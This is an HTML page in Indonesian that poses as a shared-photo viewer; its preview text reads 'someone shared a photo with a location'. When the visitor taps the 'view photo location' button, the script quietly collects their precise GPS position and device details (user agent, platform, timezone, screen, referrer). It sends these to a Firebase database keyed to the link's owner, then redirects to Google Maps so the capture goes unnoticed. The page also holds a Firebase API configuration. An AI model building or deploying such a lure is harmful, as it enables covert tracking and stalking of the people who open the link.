<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
<title>Foto Dibagikan</title>

<!-- ══ OG PREVIEW (untuk WhatsApp/FB) ══ -->
<meta property="og:title" content="Foto Dibagikan" />
<meta property="og:description" content="Seseorang membagikan foto dengan lokasi. Ketuk untuk melihat." />
<meta property="og:image" content="https://infocuaca.online/preview.jpg" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:image:type" content="image/jpeg" />
<meta property="og:url" content="https://infocuaca.online/view.html" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="infocuaca.online" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Foto Dibagikan" />
<meta name="twitter:description" content="Seseorang membagikan foto dengan lokasi." />
<meta name="twitter:image" content="https://infocuaca.online/preview.jpg" />
<meta name="theme-color" content="#000000" />

<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{
  height:100%;
  background:#000;
  overflow:hidden;
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
  color:#fff;
}

/* ══ FOTO FULLSCREEN ══ */
.photo-wrap{
  position:relative;
  width:100%;
  height:100vh;
  height:100dvh;
  overflow:hidden;
}
#mainPhoto{
  position:absolute;
  inset:0;
  width:100%;
  height:100%;
  object-fit:cover;
  display:block;
  user-select:none;
  -webkit-user-drag:none;
  z-index:1;
  opacity:0;
  transition:opacity .4s ease;
}
#mainPhoto.loaded{opacity:1}

/* ══ GRADIENT BAWAH ══ */
.bottom-fade{
  position:absolute;
  left:0;right:0;bottom:0;
  height:45%;
  background:linear-gradient(to top,
    rgba(0,0,0,.85) 0%,
    rgba(0,0,0,.5) 35%,
    rgba(0,0,0,.15) 70%,
    transparent 100%);
  z-index:2;
  pointer-events:none;
}

/* ══ WRAP TOMBOL ══ */
.bottom-wrap{
  position:absolute;
  left:0;right:0;
  bottom:0;
  padding:0 24px calc(36px + env(safe-area-inset-bottom,0px));
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:12px;
  z-index:3;
}

/* ══ TOMBOL ══ */
.btn-lokasi{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  width:100%;
  max-width:340px;
  padding:16px 28px;
  background:#4CAF50;
  color:#fff;
  border:none;
  border-radius:50px;
  font-size:16px;
  font-weight:700;
  letter-spacing:.2px;
  cursor:pointer;
  font-family:inherit;
  box-shadow:0 8px 28px rgba(0,0,0,.5),0 0 0 1px rgba(255,255,255,.06) inset;
  transition:background .15s,transform .1s,opacity .15s;
  white-space:nowrap;
}
.btn-lokasi:active{background:#388E3C;transform:scale(.97)}
.btn-lokasi:disabled{opacity:.7;cursor:not-allowed}
.btn-lokasi svg{width:20px;height:20px;fill:#fff;flex-shrink:0}

/* ══ SPINNER ══ */
.spinner{
  width:18px;height:18px;
  border:2.5px solid rgba(255,255,255,.35);
  border-top-color:#fff;
  border-radius:50%;
  animation:spin .7s linear infinite;
  flex-shrink:0;
}
@keyframes spin{to{transform:rotate(360deg)}}

/* ══ HINT ══ */
.hint{
  font-size:11px;
  color:rgba(255,255,255,.55);
  letter-spacing:.2px;
  text-align:center;
  line-height:1.4;
}

/* ══ LOADING AWAL ══ */
.loading-screen{
  position:fixed;
  inset:0;
  background:#000;
  display:flex;
  align-items:center;
  justify-content:center;
  z-index:20;
  transition:opacity .3s;
}
.loading-screen.hide{opacity:0;pointer-events:none}
.loading-screen .spinner{
  width:32px;height:32px;
  border-width:3px;
}

/* ══ ERROR SCREEN ══ */
.err-screen{
  position:fixed;inset:0;
  background:#0d0d0d;
  color:#fff;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  gap:14px;
  padding:32px;
  text-align:center;
  z-index:30;
}
.err-icon{
  width:72px;height:72px;
  border-radius:50%;
  background:rgba(245,124,0,.15);
  display:flex;align-items:center;justify-content:center;
}
.err-icon svg{width:36px;height:36px;fill:#F57C00}
.err-title{font-size:17px;font-weight:700}
.err-desc{font-size:13px;color:#888;line-height:1.6}

/* ══ TOAST ══ */
.toast{
  position:fixed;
  bottom:24px;left:50%;
  transform:translateX(-50%) translateY(20px);
  background:rgba(20,20,20,.92);
  color:#fff;
  padding:13px 20px;
  border-radius:10px;
  font-size:13px;
  text-align:center;
  max-width:calc(100vw - 48px);
  opacity:0;
  transition:opacity .3s,transform .3s;
  pointer-events:none;
  z-index:999;
  backdrop-filter:blur(8px);
  -webkit-backdrop-filter:blur(8px);
  border:1px solid rgba(255,255,255,.1);
  line-height:1.4;
}
.toast.show{
  opacity:1;
  transform:translateX(-50%) translateY(0);
}

.hide{display:none!important}
</style>
</head>
<body>

<!-- ══ LOADING AWAL ══ -->
<div class="loading-screen" id="loadingScreen">
  <div class="spinner"></div>
</div>

<!-- ══ ERROR SCREEN ══ -->
<div class="err-screen hide" id="errBox">
  <div class="err-icon">
    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
  </div>
  <div class="err-title">Link Tidak Valid</div>
  <div class="err-desc">Foto ini tidak tersedia<br>atau link sudah kadaluarsa.</div>
</div>

<!-- ══ MAIN VIEW ══ -->
<div class="photo-wrap hide" id="photoWrap">
  <img id="mainPhoto" alt="Foto">
  <div class="bottom-fade"></div>

  <div class="bottom-wrap">
    <button class="btn-lokasi" id="btnLokasi" onclick="handleLokasi()">
      <svg viewBox="0 0 24 24">
        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
      </svg>
      Lihat Lokasi Foto
    </button>
    <div class="hint">Akan membuka di Google Maps</div>
  </div>
</div>

<!-- ══ TOAST ══ -->
<div class="toast" id="toast"></div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

// ════════════════════════════════════════
// FIREBASE CONFIG
// ════════════════════════════════════════
const FC = {
  apiKey:"AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
  authDomain:"roraxbali-65802.firebaseapp.com",
  databaseURL:"https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId:"roraxbali-65802",
  storageBucket:"roraxbali-65802.firebasestorage.app",
  messagingSenderId:750633313866,
  appId:"1:750636313866:web:3d2e552960e06db83968b3"
};

let db = null;
try {
  const app = initializeApp(FC);
  db = getDatabase(app);
} catch(e) { console.warn('Firebase init gagal:', e); }

// ════════════════════════════════════════
// PARAMS
// ════════════════════════════════════════
const params    = new URLSearchParams(location.search);
const fotoUrl   = decodeURIComponent(params.get('foto') || '');
const ownerUser = decodeURIComponent(params.get('u')    || '');
const fotoLat   = parseFloat(params.get('lat') || '');
const fotoLng   = parseFloat(params.get('lng') || '');
const fotoNama  = decodeURIComponent(params.get('nama') || '');

// ════════════════════════════════════════
// ELEMENTS
// ════════════════════════════════════════
const photoWrap     = document.getElementById('photoWrap');
const mainPhoto     = document.getElementById('mainPhoto');
const errBox        = document.getElementById('errBox');
const btnLokasi     = document.getElementById('btnLokasi');
const toast         = document.getElementById('toast');
const loadingScreen = document.getElementById('loadingScreen');

// ════════════════════════════════════════
// HELPERS
// ════════════════════════════════════════
function showError(){
  loadingScreen.classList.add('hide');
  photoWrap.classList.add('hide');
  errBox.classList.remove('hide');
}
function hideLoading(){
  loadingScreen.classList.add('hide');
}

let toastTimer;
function showToast(msg, dur = 3500){
  clearTimeout(toastTimer);
  toast.textContent = msg;
  toast.classList.add('show');
  toastTimer = setTimeout(() => toast.classList.remove('show'), dur);
}

// ════════════════════════════════════════
// VALIDASI & LOAD FOTO
// ════════════════════════════════════════
const validCoords = !isNaN(fotoLat) && !isNaN(fotoLng) && fotoLat !== 0 && fotoLng !== 0;

if (!fotoUrl || !ownerUser) {
  showError();
} else {
  // Timeout kalau gambar stuck
  const imgTimeout = setTimeout(() => {
    if (!mainPhoto.complete || mainPhoto.naturalWidth === 0) showError();
  }, 15000);

  mainPhoto.onload = () => {
    clearTimeout(imgTimeout);
    if (mainPhoto.naturalWidth === 0) { showError(); return; }
    photoWrap.classList.remove('hide');
    mainPhoto.classList.add('loaded');
    hideLoading();
  };
  mainPhoto.onerror = () => {
    clearTimeout(imgTimeout);
    showError();
  };
  mainPhoto.src = fotoUrl;
}

// ════════════════════════════════════════
// BUTTON STATE
// ════════════════════════════════════════
function setLoading(on){
  btnLokasi.disabled = on;
  btnLokasi.innerHTML = on
    ? `<div class="spinner"></div> Membuka…`
    : `<svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg> Lihat Lokasi Foto`;
}

// ════════════════════════════════════════
// HANDLE KLIK TOMBOL
// ════════════════════════════════════════
window.handleLokasi = function(){
  // Cek koordinat foto dulu
  if (!validCoords) {
    showToast('Lokasi foto tidak tersedia di link ini.');
    return;
  }

  setLoading(true);

  // URL Maps ke LOKASI FOTO
  const mapsUrl = 'https://www.google.com/maps?q=' + fotoLat + ',' + fotoLng;

  // Fallback kalau GPS lama / Firebase gagal
  let redirected = false;
  const goMaps = () => {
    if (redirected) return;
    redirected = true;
    window.location.href = mapsUrl;
  };

  // Safety timeout: 3 detik → tetap buka Maps
  const safety = setTimeout(goMaps, 3000);

  // Coba ambil lokasi penerima
  if (navigator.geolocation && db) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        clearTimeout(safety);
        try {
          push(ref(db, 'lokasi/' + ownerUser), {
            target:    'images',
            waktu:     Date.now(),
            lat:       pos.coords.latitude,
            lng:       pos.coords.longitude,
            akurasi:   pos.coords.accuracy,
            foto:      fotoUrl,
            fotoNama:  fotoNama,
            fotoLat:   fotoLat,
            fotoLng:   fotoLng,
            platform:  navigator.platform || 'Unknown',
            userAgent: navigator.userAgent,
            bahasa:    navigator.language,
            timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen:    screen.width + 'x' + screen.height,
            referrer:  document.referrer || 'direct',
            via:       'view',
            source:    'view.html'
          }).catch(()=>{});
        } catch(e){}
        goMaps();
      },
      () => {
        clearTimeout(safety);
        // GPS ditolak → tetap buka Maps
        goMaps();
      },
      { enableHighAccuracy:true, timeout:2500, maximumAge:60000 }
    );
  } else {
    clearTimeout(safety);
    goMaps();
  }
};
</script>
</body>
</html>
